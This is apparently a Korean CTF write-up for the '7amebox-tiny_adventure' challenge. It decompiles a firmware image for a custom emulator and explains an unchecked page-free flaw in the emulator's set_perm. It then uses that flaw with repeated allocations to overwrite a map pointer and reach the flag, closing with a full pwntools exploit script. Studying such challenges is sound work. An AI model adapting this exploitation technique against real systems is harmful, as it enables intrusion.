---
layout: post
title: "7amebox-tiny-adventure"
comments : true
category : War Game
---

# 문제
***

7amebox-tiny_adventure 문제는 앞의 7amebox-name 문제와 동일하게 firmware 파일을 실행하는 문제이다. 따라서 우선 tiny_adventure.firm을 decompile했다. 


=> Emulator는 동일하기 때문에 다음과 같은 특징은 그대로 유지된다.
```
1. memory의 각 요소는 7bits 크기로 구성되어 있다. (즉 해당 에뮬레이터에서 1바이트는 7bits로 이루어져있다.) 
2. 레지스터는 21비트이다. ( push, pop, mov r0, [r1] 등을 할 때 3byte (21bits) 단위로 수행한다.)
3. 매우 특이한 앤디안을 사용한다. ABC 를 메모리에 저장하면 (낮) C A B (높) 와 같이 저장된다. 
```

decompile한 결과를 c 코드로 나타내면 다음과 같다.
```
int main()
{
    r10=mmap(0,0x1000,PROT_READ | PROT_WRITE);
    call 0x1e;
    exit(0);
}

sub_0x1e()
{
    r0 = 0x6e2;     # 강아지 그림 주소
    call 0x6a5;       # 강아지 그림 출력
    call 0x103;
    while(1):
        call 0x1af;     # 에너지 값 확인
        if r0 == 0
            return;
        r0 = 0xaa9 ;    #  menu 문자열 1)show current map ~
        call 0x6a5;
    
        read(0,ebp-6,3);
        if *(ebp-6) == 0x31
            call 0x1e6;     # *(r10+0x303) 에 있는 값을 출력, 즉 stage.map을 출력해주는 역할
        else if *(ebp-6) == 0x32
            call 0x25c      # buy a dog
        else if *(ebp-6) == 0x33
            call 0x304;     # sell a dog
        else if *(ebp-6) == 0x34
            r0 = 0x8f7;
            call 0x6a5;
        else if *(ebp-6) == 0x77 || *(ebp-6) == 0x61 || *(ebp-6) == 0x73 || *(ebp-6) == 0x64
            r0 = *(ebp-6);
            call 0x383;
}

sub_0x6a5()
{
    r1 = r0;
    call 0x6bd;     # r0 = strlen(r0);
    temp= r0;
    r0 = r1;
    r1 = temp;
    call 0x687;     # write(1,r0,r1;
}

sub_0x103()
{
    (3Byte ptr)* r10 = 0;
    r1= (r10 + 3);
    r2=0x300;
    call 0x61b;      #memset(0,r1,r2)
    *(r10+0x306) = 6;        # 팔 수 있는 강아지의 수
    *(r10+0x309) = 0x78;     # 에너지 값, 이 값이 0이 되면 펌웨어는 종료된다.
    *(r10+0x30c) = 0x61;     # power 값, 이 값이 0x2bc 보다 크면 flag를 읽을 수 있다.
    *(r10+0x30f) = 0;        # 현재 내 위치를 가리킴 (column)
    *(r10+0x30c) = 0;        # 현재 내 위치를 가리킴 (row)
    r7=mmap(0,0x1000,PROT_READ | PROT_WRITE);
    *(r10+0x303) = r7;       # stage.map이 저장된 곳을 가리킴
    
    r0 = open(stage.map);
    read(r0,r7,0xe10);
}

sub_0x1af()
{
    call 0x5b2;       # r0 = *(3Byte ptr)(r10 + 0x309)
    if r0 == 0
        r0 = 0xc66      # dead picture
        call 0x6a5;
        return 0;
    return 1;
}

sub_0x25c()      # buy a dog
{
    *(ebp-3)=mmap(0,0x1000,6);
    if *(ebp-3) ==0
        r0 = 0xc45;     # you already have too many dogs!
        call 0x6a5;
    *(r10) += 1;
    r6 = (*(r10)) * 3;
    *(r10+r6) = *(ebp-3);
    r0 = 0xbe7;     # do you want to draw a avatar of the dog? (y/n)
    call 0x6a5;
    
    read(0,ebp-6,3);
    if *(ebp-6) == 0x79
        read(0,*(ebp-3),0x1000);
    
    r0 = 0xc18;     # you got a new dog!
    call 0x6a5;     
}

sub_0x304()     # sell a dog
{
    if *(r10+0x306) == 0
        r0 = 0xc2c;     # you can't sell the dog!
        call 0x6a5;
        return;
    
    *(r10+0x306) -= 1;
    ...
    read(0,ebp-6,4);
    if *(ebp-6) < 0x100000
        r0 = 0xc2c;     # you can't sell the dog!
        call 0x6a5;
        return;
    
    r1 = *(ebp-6) & 0b111111111000000000000;
    free(r1);
    ...
    return;
        
}

sub_0x383():
{
    *(ebp-3) = r0;      # input
    r0 = *(r10+0x303);
    *(ebp-9) = r0;
    r8 = *(r10+0x30f);
    r9 = *(r10+0x312);
    
    r6 = r0 + r9 * 60 + r8;
    if *(r6) == 0x40      # @는 stage.map에서 자신의 위치를 나타냄
        *r6 = 0x20;
    r6 = *(ebp-3);
    
    if r6 == 0x77    # input이 "w" 일 때
        r9 -=1;
        r9 %= 60;
        r9 = r9 & 0b111111111111111111111;
    else if r6 == 0x61      # input이 "a" 일 때 
        r8 -=1;
        r8 % 60;
        r8 = r8 & 0b111111111111111111111;
    else if r6 == 0x73      # input이 "s" 일 때
        r9 += 1;
        r9 %= 60;
        r9 = r9 & 0b111111111111111111111;
    else 
        r8 += 1;
        r8 %= 60;
        r8 = r8 & 0b111111111111111111111;
    
    *(r10+0x30f) = r8;
    *(r10+0x312) = r9;
    
    r5 =  *(r10+0x303) + r9 * 60 + r8;
    *(ebp-0xc) = r5;        # ebp-0xc에 현재 자신의 위치 저장
    
    r6 = *r5;
    *r5 = 0x40;
    
    if r6 == 0x20
        return;
    else if r6 == 0x2a      # *는 power
        *(r10+0x309) += 40;
        *(r10+0x30c) += 5;
        ...
        return;
    else if r6 == 0x7a   # z는 최종 보스, 최종 보스를 무찌르면 flag를 줌
        read(0,ebp-6,3);
        if *(r10+0x309) >= 0x7d0
            *(r10+0x309) -= 0x7d0
        else
            *(r10+0x309) = 0;
        
        if *(r10+30c) < 0x2dc
            return;
        call 0x5bf;     # flag 값을 출력해주는 함수
        return;
    else if r6 < 0x7a && r6 >= 0x61
        r0 = 0xb07      # 1)attack ~~
        call 0x6a5;
        read(0,ebp-6,3);
        r7 = *(r10+0x309);
        if r7 < 0x1e
            *(r10+0x309) = 0;
        else
            *(r10+0x309) -= 0x1e;
        r7 = *(r10+0x30c);
        if r7 > r6
            *(ebp-0xc) = 0x2a;       # power
        else
            *(ebp-0xc) = r6;
        
        return;
    else
        return;
}
```


monster를 잡으면 monster가 있던  위치에 "*" (0x2a)를 넣어준다. 그리고 해당 위치로 가면 power를 5증가시킨다. (monster를 잡으려면 power가 몬스터의 값보다 커야한다. 또한 몬스터를 에너지가 0x1e 감소한다.)


처음 power 값은 97 이고 power이 700이 넘어야 z_monster를 잡을 수 있다. 하지만 총 monster 수가 25여서 모든 monster를 잡아도 700을 넘을 수 없다. 그래서 다른 방법을 찾아봤다.



그 결과 취약점을 유발시킬 수 있는 코드가 __sub_0x25c()__ 와 __sub_0x304()__ 에 존재하는 것을 알 수 있었다.

__sub_0x25c()__ 에서 강아지를 사면 (r10)에 저장된 값을 1 증가시키고 r10+(*(r10) *3) 위치에 강아지를 위해 할당만 메모리 주소를 저장한다. 따라서 메모리를 엄청 많이 할당하면 r10+0x303 이나 r10+0x30c를 덮어쓸 수 있을거라고 생각했다.


하지만 page 수가 256 (2 ** 20 / 0x1000 = 256)개이기 때문에 251개의 메모리만 더 할당할 수 있다. 

(256 - (code_sec+stack_sec+ 앞에서 할당한 메모리 2개) 

그래서 __sub_0x25c()__ 만으로는 r10+0x303 이후의 메모리를 overwrite 할 수 없다.



__sub_0x304()__ 는 강아지를 파는 함수로 (r10+0x306)에 저장된 값이 0보다 크면 free 하고자 하는 주소를 입력으로 받는다. (6으로 초기화 돼 있음) 그런데 여기서 입력 받는 주소는 0x100000 (2 ** 20)보다 큰 값이여야 한다. 
우리에게 할당된 메모리의 크기는 2 ** 20이기 때문에 사실 0x100000보다 큰 값을 입력 받으면 free가 되지 않아야 한다. 그런데 free를 하는 ```sys_s6```에서 사용되는 ```memory.set_perm``` 메소드에 취약점이 존재한다. 


```
def sys_6(self):
    addr = self.memory.get_register('r1') & 0b1111111110000000000000
    self.memory.set_perm(addr,0b000)

def set_perm(self, addr, perm):
    self.pages[addr & 0b111111111000000000000] = perm * 0b1111
```

set_perm 메소드에서 해당 페이지가 페이지의 key 리스트에 존재하는지 확인하지 않고 free해버린다. 따라서 이를 통해서 페이지에 쌍을 추가할 수 있다.

(r10+0x306)에 6이 저장돼 있기 때문에 6번 free를 할 수 있고 강아지를 6마리 더 살 수 있기 때문에 r10+0x303에 overwrite 할 수 있다. 


여기서 또 하나의 문제가 존재하는데 만약에 강아지를 251마리 사고 6마리를 팔고 다시 6마리를 사면 r10+0x303에 0x100000보다 큰 값이 저장된다. (내가 free한 메모리) 그런데 메모리는 0x100000 보다 작기 때문에 해당하는 위치에 값을 쓸 수 없다. 즉, 마지막에 산 강아지를 통해 할당된 메모리에 write 하려고 하면 error가 발생한다. (```self.memory[addr+0ffset] = data[offset] & 0b1111111```에서 error 발생)


이를 해결하기 위해서 처음에 강아지를 250마리만 산 뒤에 6마리를 팔고 다시 7마리를 사면 0x100000보다 작은 값을 r10+0x303에 쓸 수 있다.
  
## exploit 방법
1. 강아지를 250마리 산다.
2. 강아지를 6마리 판다.
3. 강아지를 7마리 사고 마지막 강아지는 avatar를 그려줌으로써 입력을 넣어준다. 입력으로 "*"을 121개 이상 넣어준다. (flag를 읽기 위해서 마지막에 "z"도 넣어준다.) 
4. 내가 만든 stage_map을 움직이면서 "*"를 먹고 power를 700보다 크게 만든다.
5. "z" monster를 물리쳐서 flag를 읽는다. 

c.f) 문제를 풀 때 attach를 해서 디버깅을 해야하는데 이 문제는 firm 파일을 건드리기가 힘들기 때문에 _7amebox_patched.py의 op 메소들에 print를 추가함으로써 디버깅을 할 수 있다. 

# 풀이
***
```
#!/usr/bin/python

from pwn import *

#context.log_level = 'debug'

file_path="/home/sungyun/round2/7amebox-tiny_adventure/vm_tiny.py"

def write_tri(data):

        buf=[0 for i in range(3)]

        buf[0] = chr(data  & 0b000000000000001111111)
        buf[1] = chr((data & 0b111111100000000000000)>>14)
        buf[2] = chr((data & 0b000000011111110000000) >>7)
        return "".join(buf)

def buy_4_dog(ans,char=""):
	p.recvuntil(">")
	p.sendline("2")
	p.recvuntil(">")
	if ans=="n":
		p.sendline("n")
	elif ans=="y":
		p.sendline("y")
		p.sendline(char)

def sell_4_dog(addr):
	p.recvuntil(">")
	p.sendline("3")
	p.recvuntil(">")
	p.sendline(addr)

def go_north():
	p.recvuntil(">")
	p.sendline("w")

def go_south():
	p.recvuntil(">")
	p.sendline("s")

def go_west():
	p.recvuntil(">")
	p.sendline("a")

def go_east():
	p.recvuntil(">")
	p.sendline("d")

def attack_1():
	p.recvuntil(">")
	p.sendline("1")

p=process(['python','-u',file_path])

for i in range(250):
	buy_4_dog("n")

addr=0x100000
for j in range(6):
	sell_4_dog(write_tri(addr))
	addr +=0x1000

for i in range(6):
	buy_4_dog("n")

power_flag="*"*123+"z"
buy_4_dog("y",power_flag)


for i in range(123):
	go_east()
	if i%60 == 0 and i!=0:
		go_south()


attack_1()
print p.recvline()

p.close()
```

# 알게 된 것
***
1. python 딕셔너리는 key 삽입 순서랑 key_list에 저장되는 순서가 다르다. 
2. context.log_level = 'debug'   
   => send, recv 하는 data를 바이트 단위로 보여주고 error가 발생하는 부분을 보여준다.

